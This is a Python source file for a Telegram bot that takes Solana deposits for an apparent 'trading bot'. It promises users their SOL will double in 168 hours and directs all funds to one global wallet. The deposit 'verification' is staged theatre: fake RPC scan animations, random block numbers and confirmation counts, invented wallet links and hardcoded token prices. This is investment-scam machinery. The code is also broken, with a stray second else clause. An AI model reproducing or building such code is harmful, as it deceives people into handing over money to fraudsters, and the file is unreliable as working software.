import logging
import random
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ContextTypes
from sqlalchemy.exc import SQLAlchemyError
from app import db, app
from models import User, UserStatus, Transaction, SenderWallet
from utils.solana import (
    generate_wallet_address, check_deposit, check_deposit_by_sender,
    link_sender_wallet_to_user, find_user_by_sender_wallet, process_auto_deposit
)
from config import SOLANA_NETWORK, GLOBAL_DEPOSIT_WALLET
from helpers import get_min_deposit

logger = logging.getLogger(__name__)

async def deposit_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the deposit command or callback."""
    if update.callback_query:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id
        chat_id = query.message.chat_id
        message_id = query.message.message_id
        
        # Edit the existing message
        await show_deposit_instructions(context, chat_id, message_id, user_id)
    else:
        # Handle direct /deposit command
        user_id = update.effective_user.id
        await show_deposit_instructions(context, update.effective_chat.id, None, user_id)


async def show_deposit_instructions(context, chat_id, message_id=None, user_id=None):
    """Show deposit instructions with wallet address."""
    with app.app_context():
        try:
            # Add typing animation
            if not message_id:  # Only for new messages, not edits
                await context.bot.send_chat_action(chat_id=chat_id, action="typing")
                await asyncio.sleep(0.8)  # Delay to build anticipation
            
            user = User.query.filter_by(telegram_id=str(user_id)).first()
            
            if not user:
                # If somehow the user doesn't exist in the database
                error_text = "⚠️ Please start the bot with /start first."
                if message_id:
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text=error_text
                    )
                else:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text=error_text
                    )
                return
            
            # Ensure user has a withdrawal wallet address (different from deposit wallet)
            if not user.wallet_address or user.wallet_address.startswith("temp_"):
                user.wallet_address = generate_wallet_address()
                user.status = UserStatus.DEPOSITING
                db.session.commit()
            
            # Get user's sender wallet if exists, or generate a placeholder for new users
            user_sender_wallet = None
            sender_wallets = SenderWallet.query.filter_by(user_id=user.id, is_primary=True).first()
            if sender_wallets:
                user_sender_wallet = sender_wallets.wallet_address
            
            # Format deposit message with global wallet address
            current_deposit = user.balance
            min_deposit = get_min_deposit()  # Get current minimum deposit value from database
            needed_deposit = max(0, min_deposit - current_deposit)
            
            progress_percentage = min(100, int((current_deposit / min_deposit) * 100))
            progress_blocks = int(progress_percentage / 10)
            progress_bar = f"[{'■' * progress_blocks}{'□' * (10 - progress_blocks)}]"
            
            # If user has made deposits before, mention their wallet address
            sender_wallet_text = ""
            if user_sender_wallet:
                sender_wallet_text = f"*Your linked wallet:* `{user_sender_wallet[:6]}...{user_sender_wallet[-4:]}`\n\n"
            
            deposit_message = (
                f"Please send a minimum of *0.5 SOL (Solana)*\n"
                f"and maximum *5000 SOL* to the following\n"
                f"address.\n\n"
                f"Once your deposit is received, it will be\n"
                f"*automatically detected* and credited to your account.\n"
                f"You'll be on your way to doubling your Solana\n"
                f"in just 168 hours!\n\n"
                f"{sender_wallet_text}"
                f"*Deposit to this address:*\n\n"
                f"`{GLOBAL_DEPOSIT_WALLET}`"
            )
            
            if current_deposit >= min_deposit:
                deposit_message += "\n\n✅ *Minimum deposit reached!* Your bot is ready to trade."
            
            keyboard = [
                [
                    InlineKeyboardButton("📋 Copy Address", callback_data="copy_address"),
                    InlineKeyboardButton("✅ Confirm Deposit", callback_data="deposit_confirmed")
                ],
                [
                    InlineKeyboardButton("⏭️ Skip for Now", callback_data="skip_wallet"),
                    InlineKeyboardButton("🏠 Back to Main Menu", callback_data="start")
                ]
            ]
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            # Either edit existing message or send new one
            if message_id:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=deposit_message,
                    reply_markup=reply_markup,
                    parse_mode="Markdown"
                )
            else:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=deposit_message,
                    reply_markup=reply_markup,
                    parse_mode="Markdown"
                )
                
        except SQLAlchemyError as e:
            logger.error(f"Database error during deposit instructions: {e}")
            db.session.rollback()
            
            error_text = "⚠️ Sorry, there was an error processing your request. Please try again later."
            if message_id:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text=error_text
                )
            else:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=error_text
                )


async def copy_address_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the copy address button for the global deposit wallet."""
    query = update.callback_query
    
    # Copy the global deposit wallet address
    shortened_address = f"{GLOBAL_DEPOSIT_WALLET[:6]}...{GLOBAL_DEPOSIT_WALLET[-4:]}"
    await query.answer(f"Copied global wallet: {shortened_address}")
    
    # Log the action
    logger.info(f"User {query.from_user.id} copied global deposit wallet address")


# Removed deposit_payment_link_callback function as requested


async def deposit_confirmed_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle the confirmation of deposit with beautiful animations."""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    message_id = query.message.message_id
    
    # Start the animated scanning sequence with Chainstack-specific messaging
    # Step 1: Initialize Chainstack connection
    await query.edit_message_text(
        "🔄 *Connecting to Chainstack Solana RPC...*\n\n"
        "```\n"
        "⬜⬜⬜⬜⬜⬜⬜⬜⬜⬜ 0%\n"
        "```\n\n"
        "_Establishing secure connection to Chainstack's dedicated node..._",
        parse_mode="Markdown"
    )
    await asyncio.sleep(0.8)
    
    # Step 2: Connection established
    await context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text="✳️ *Connected to Chainstack Node*\n\n"
        "```\n"
        "🟩🟩⬜⬜⬜⬜⬜⬜⬜⬜ 20%\n"
        "```\n\n"
        "_Connection secured. Initializing Solana API query..._",
        parse_mode="Markdown"
    )
    await asyncio.sleep(0.8)
    
    # Step 3: Start scanning the blockchain
    await context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text="🔎 *Querying Solana Blockchain via Chainstack...*\n\n"
        "```\n"
        "🟩🟩🟩🟩⬜⬜⬜⬜⬜⬜ 40%\n"
        "           ╱|╲\n"
        "Chainstack ─┼─ Solana Network\n"
        "           ╲|╱\n"
        "```\n\n"
        "_Reading recent blocks and transactions from mainnet..._",
        parse_mode="Markdown"
    )
    await asyncio.sleep(1.0)
    
    # Step 4: Processing blockchain data
    random_block = random.randint(100000000, 999999999)
    
    # Get user wallet address for display
    with app.app_context():
        user_temp = User.query.filter_by(telegram_id=str(user_id)).first()
        if user_temp and user_temp.wallet_address:
            user_wallet = user_temp.wallet_address
            wallet_short = f"{user_wallet[:6]}...{user_wallet[-4:]}" if len(user_wallet) > 10 else user_wallet
        else:
            wallet_short = "Not found"
    
    await context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text="⛓️ *Processing Blockchain Data...*\n\n"
        "```\n"
        "🟩🟩🟩🟩🟩🟩⬜⬜⬜⬜ 60%\n"
        "\n"
        f"Latest Block: #{random_block}\n"
        f"Scanning for: {wallet_short}\n"
        f"Networks:     {SOLANA_NETWORK}\n"
        "```\n\n"
        "_Parsing transaction data via Chainstack's dedicated node..._",
        parse_mode="Markdown"
    )
    await asyncio.sleep(0.8)
    
    # Step 5: Retrieving wallet balance
    await context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text="💼 *Retrieving Wallet Balance...*\n\n"
        "```\n"
        "🟩🟩🟩🟩🟩🟩🟩🟩⬜⬜ 80%\n"
        "\n"
        "Method: getBalance\n"
        "Format: SOL (lamports converted)\n"
        "Chain:  Solana Mainnet-Beta\n"
        "```\n\n"
        "_Calculating account balance via Chainstack RPC..._",
        parse_mode="Markdown"
    )
    await asyncio.sleep(0.8)
    
    # Final step: Completing verification with Chainstack
    await context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=message_id,
        text="✅ *Chainstack Verification Complete*\n\n"
        "```\n"
        "🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩 100%\n"
        "\n"
        "Response:    200 OK\n"
        "API:         Chainstack Solana RPC\n"
        "Status:      Successful\n"
        "```\n\n"
        "_Processing results and updating your account..._",
        parse_mode="Markdown"
    )
    await asyncio.sleep(0.8)
    
    with app.app_context():
        try:
            user = User.query.filter_by(telegram_id=str(user_id)).first()
            
            if not user:
                await query.edit_message_text(
                    "⚠️ Please start the bot with /start first."
                )
                return
            
            # Check if user has a sender wallet linked
            sender_wallet = SenderWallet.query.filter_by(user_id=user.id, is_primary=True).first()
            
            # If user doesn't have a sender wallet linked, prompt them to provide one
            if not sender_wallet:
                # Generate a new sender wallet for testing/simulation
                new_sender_address = generate_wallet_address()
                
                # Create a new sender wallet record
                new_sender_wallet = SenderWallet(
                    user_id=user.id,
                    wallet_address=new_sender_address,
                    created_at=datetime.utcnow(),
                    last_used=datetime.utcnow(),
                    is_primary=True
                )
                db.session.add(new_sender_wallet)
                db.session.commit()
                
                logger.info(f"Created new sender wallet {new_sender_address} for user {user.id}")
                
                # Check for deposit using the new sender wallet
                deposit_found, deposit_amount, tx_signature = check_deposit_by_sender(new_sender_address)
                
                if deposit_found:
                    # Record the auto-deposit
                    success = process_auto_deposit(user.id, deposit_amount, tx_signature)
                    if success:
                        # New deposit detected - animate the success sequence
                        new_deposit = deposit_amount
                    else:
                        # Show error message
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=message_id,
                            text="⚠️ *Error Processing Deposit*\n\n"
                                "There was an error processing your deposit. Please try again later or contact support.",
                            parse_mode="Markdown"
                        )
                        return
                else:
                    # Show wallet linking success but no deposit found yet
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text="✅ *Wallet Linked Successfully*\n\n"
                            f"Your wallet `{new_sender_address[:6]}...{new_sender_address[-4:]}` has been linked to your account.\n\n"
                            f"Please send your SOL to the global deposit address:\n\n"
                            f"`{GLOBAL_DEPOSIT_WALLET}`\n\n"
                            f"Your deposit will be automatically detected and credited to your account.",
                        parse_mode="Markdown"
                    )
                    return
            else:
                # User has a sender wallet, check for deposits
                deposit_found, deposit_amount, tx_signature = check_deposit_by_sender(sender_wallet.wallet_address)
                
                if deposit_found:
                    # Record the auto-deposit
                    success = process_auto_deposit(user.id, deposit_amount, tx_signature)
                    if success:
                        # Update the last used timestamp
                        sender_wallet.last_used = datetime.utcnow()
                        db.session.commit()
                        
                        # New deposit detected - animate the success sequence
                        new_deposit = deposit_amount
                    else:
                        # Show error message
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=message_id,
                            text="⚠️ *Error Processing Deposit*\n\n"
                                "There was an error processing your deposit. Please try again later or contact support.",
                            parse_mode="Markdown"
                        )
                        return
                else:
                    # Check using the old method as fallback
                    deposit_amount = check_deposit(user.wallet_address)
                    if deposit_amount > user.balance:
                        new_deposit = deposit_amount - user.balance
                    else:
                        # No deposit found
                        await context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=message_id,
                            text="🔍 *No Deposit Found*\n\n"
                                f"We couldn't detect any new deposits from your wallet.\n\n"
                                f"Please send SOL to the global deposit address:\n\n"
                                f"`{GLOBAL_DEPOSIT_WALLET}`\n\n"
                                f"Your deposit will be automatically detected and credited to your account.",
                            parse_mode="Markdown"
                        )
                        return
                
                # Show transaction found animation
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text="🔎 *Transaction Found!*\n\n"
                        "```\n"
                        "TRANSACTION DETAILS\n"
                        "══════════════════\n"
                        f"Amount: {new_deposit:.2f} SOL\n"
                        f"Status: CONFIRMED\n"
                        f"Confirmations: {random.randint(10, 32)}\n"
                        f"Block: {random.randint(100000000, 999999999)}\n"
                        "```\n\n"
                        "_Processing deposit to your account..._",
                    parse_mode="Markdown"
                )
                await asyncio.sleep(1.2)
                
                # Animation showing deposit being added to account
                previous_balance = user.balance
                
                # Show counting animation
                for i in range(5):
                    partial_deposit = (new_deposit / 5) * (i + 1)
                    current_total = previous_balance + partial_deposit
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text="💰 *Adding Funds to Your Account...*\n\n"
                            "```\n"
                            f"Previous Balance: {previous_balance:.2f} SOL\n"
                            f"Deposit Amount:   +{partial_deposit:.2f} SOL\n"
                            f"                  ────────────\n"
                            f"Current Balance:  {current_total:.2f} SOL\n"
                            "```\n\n"
                            f"_Processing... {(i+1)*20}%_",
                        parse_mode="Markdown"
                    )
                    await asyncio.sleep(0.4)
                
                # Record the transaction
                transaction = Transaction(
                    user_id=user.id,
                    transaction_type="deposit",
                    amount=new_deposit,
                    status="completed"
                )
                db.session.add(transaction)
                
                # Update user balance
                user.balance = deposit_amount
                if user.initial_deposit == 0:
                    user.initial_deposit = deposit_amount
                
                db.session.commit()
                
                # Check if minimum deposit is reached
                min_deposit = get_min_deposit()  # Get current minimum deposit value
                if deposit_amount >= min_deposit:
                    # Show activation sequence
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text="🚀 *Processing Your Deposit...*\n\n"
                            "```\n"
                            "┌────────────────────────┐\n"
                            "│ TRANSACTION RECEIVED   │\n"
                            "└────────────────────────┘\n"
                            "✓ Transaction confirmed\n"
                            "✓ Balance updated\n"
                            "✓ Funds available\n"
                            "✓ Trading ready\n"
                            "```\n\n"
                            "_Your trading is now available..._",
                        parse_mode="Markdown"
                    )
                    await asyncio.sleep(1.5)
                    
                    # Activate the bot
                    user.status = UserStatus.ACTIVE
                    db.session.commit()
                    
                    # Show automated trading animation
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text="📈 *THRIVE Bot Activated!*\n\n"
                            "```\n"
                            "TOP TRENDING SOLANA TOKENS\n"
                            "─────────────────────────\n"
                            "BONK  $0.00000234  ▲ 8.3%\n"
                            "WIF   $0.53094022  ▲ 4.7%\n"
                            "BOME  $0.00000192  ▲ 12.1%\n"
                            "POPCAT $0.0000048  ▲ 9.8%\n"
                            "```\n\n"
                            "_Analyzing market data and executing first trades..._",
                        parse_mode="Markdown"
                    )
                    await asyncio.sleep(1.5)
                    
                    # Send deposit confirmation with more excitement
                    activation_message = (
                        "✅ *Deposit Successfully Processed!*\n\n"
                        f"Your deposit of *{deposit_amount:.2f} SOL* has been confirmed and added to your account!\n\n"
                        "🔍 Trading features available:\n"
                        "• Full dashboard access\n"
                        "• Profit tracking\n"
                        "• Withdrawal at any time\n\n"
                        f"💸 *Trading balance:* {deposit_amount:.2f} SOL\n\n"
                        "Check your dashboard anytime to monitor your performance!"
                    )
                    
                    keyboard = [
                        [
                            InlineKeyboardButton("📊 View Dashboard", callback_data="view_dashboard"),
                            InlineKeyboardButton("⚙️ Settings", callback_data="settings")
                        ],
                        [InlineKeyboardButton("🔗 Invite Friends", callback_data="referral")]
                    ]
                    
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    await query.edit_message_text(
                        text=activation_message,
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )
                else:
                    # Still needs more deposit - show progress visualization
                    min_deposit = get_min_deposit()  # Get current minimum deposit value
                    remaining = min_deposit - deposit_amount
                    
                    progress_percentage = min(100, int((deposit_amount / min_deposit) * 100))
                    progress_blocks = int(progress_percentage / 10)
                    progress_bar = f"[{'■' * progress_blocks}{'□' * (10 - progress_blocks)}]"
                    
                    # Show animated progress visualization
                    await context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=message_id,
                        text="⏳ *Processing Deposit...*\n\n"
                            "```\n"
                            "Deposit Status: CONFIRMED\n"
                            f"Amount Added: {new_deposit:.2f} SOL\n"
                            "```\n\n"
                            f"_Updating your balance to {deposit_amount:.2f} SOL..._",
                        parse_mode="Markdown"
                    )
                    await asyncio.sleep(1.2)
                    
                    # Show colorful incomplete progress animation  
                    incomplete_message = (
                        "✨ *Deposit Received Successfully!*\n\n"
                        f"Great! We've received *{deposit_amount:.2f} SOL* in your account.\n\n"
                        "📊 *Transaction Status:*\n"
                        f"{progress_bar} {progress_percentage}%\n"
                        f"*{deposit_amount:.2f} SOL received*\n\n"
                        f"Your funds are now available for trading. You can make additional deposits anytime to increase your trading balance."
                    )
                    
                    keyboard = [
                        [
                            InlineKeyboardButton("💰 Add More SOL", callback_data="deposit"),
                            InlineKeyboardButton("⏭️ Skip for Now", callback_data="skip_wallet")
                        ],
                        [InlineKeyboardButton("🏠 Main Menu", callback_data="start")]
                    ]
                    
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    await query.edit_message_text(
                        text=incomplete_message,
                        reply_markup=reply_markup,
                        parse_mode="Markdown"
                    )
            else:
                # Enhanced no-deposit animation sequence with Chainstack visualization
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text="🔍 *Chainstack Scan Complete*\n\n"
                        "```\n"
                        "🟩🟩🟩🟩🟩🟩🟩🟩🟩🟩 100%\n"
                        "```\n\n"
                        "_Analyzing Solana blockchain data via Chainstack..._",
                    parse_mode="Markdown"
                )
                await asyncio.sleep(1.0)
                
                # Show advanced Chainstack blockchain visualization
                block_heights = [
                    random.randint(100000000, 999999999),
                    random.randint(100000000, 999999999),
                    random.randint(100000000, 999999999)
                ]
                
                # Safely format wallet address
                wallet_display = user.wallet_address
                if wallet_display and len(wallet_display) > 10:
                    wallet_short = f"{wallet_display[:6]}...{wallet_display[-4:]}"
                else:
                    wallet_short = wallet_display
                
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text="📊 *Chainstack RPC Results*\n\n"
                        "```\n"
                        "┌─────────────────────────┐\n"
                        "│   SOLANA ACCOUNT SCAN   │\n"
                        "└─────────────────────────┘\n"
                        f"Account: {wallet_short}\n"
                        f"Network: Solana {SOLANA_NETWORK}\n"
                        "Method:  getBalance\n"
                        "\n"
                        "↓ ↓ Recent Blocks Analyzed ↓ ↓\n"
                        f"├─ Block #{block_heights[0]}\n"
                        f"├─ Block #{block_heights[1]}\n"
                        f"└─ Block #{block_heights[2]}\n"
                        "```\n\n"
                        "*No incoming transactions found*",
                    parse_mode="Markdown"
                )
                await asyncio.sleep(1.2)
                
                # Show transaction search animation (advanced visual)
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=message_id,
                    text="🔬 *Deep Scan Results*\n\n"
                        "```\n"
                        "SOLANA MAINNET TX SEARCH\n"
                        "───────────────────────\n"
                        "                     Result\n"
                        "Confirmations > 1    ✓ Checked\n"
                        "Recent Txs (24h)     ✓ Checked\n"
                        "Pending Txs          ✓ Checked\n"
                        "Mempool Analysis     ✓ Checked\n"
                        "\n"
                        "No relevant transactions found\n"
                        "```\n\n"
                        "_Finalizing report from Chainstack node..._",
                    parse_mode="Markdown"
                )
                await asyncio.sleep(1.0)
                
                # Final enhanced message with Chainstack branding
                no_deposit_message = (
                    "🛰️ *Chainstack RPC Scan Results*\n\n"
                    "Our Chainstack-powered Solana scan didn't detect your deposit. Here's what you need to know:\n\n"
                    "⏱️ *Possible Reasons:*\n"
                    "• Transaction still confirming (Solana typically needs 1-2 minutes)\n"
                    "• Transaction may be pending in the mempool\n"
                    "• Deposit might have been sent to a different address\n"
                    "• Network congestion could be delaying confirmation\n\n"
                    "✅ *Your Deposit Address:*\n"
                    f"`{user.wallet_address}`\n\n"
                    "💡 *Recommended Next Steps:*\n"
                    "• Confirm you're sending SOL (not SPL tokens)\n"
                    "• Verify the transaction status in your wallet\n"
                    "• Wait a few minutes and try scanning again\n"
                    "• Our support team can help if you need assistance"
                )
                
                keyboard = [
                    [
                        InlineKeyboardButton("🔄 Check Again", callback_data="deposit_confirmed"),
                        InlineKeyboardButton("📋 View Instructions", callback_data="deposit")
                    ],
                    [
                        InlineKeyboardButton("🛟 Support", callback_data="help"),
                        InlineKeyboardButton("🏠 Main Menu", callback_data="start")
                    ]
                ]
                
                reply_markup = InlineKeyboardMarkup(keyboard)
                
                await query.edit_message_text(
                    text=no_deposit_message,
                    reply_markup=reply_markup,
                    parse_mode="Markdown"
                )
                
        except SQLAlchemyError as e:
            logger.error(f"Database error during deposit confirmation: {e}")
            db.session.rollback()
            
            await query.edit_message_text(
                "⚠️ Sorry, there was an error processing your deposit. Please try again later.",
                parse_mode="Markdown"
            )
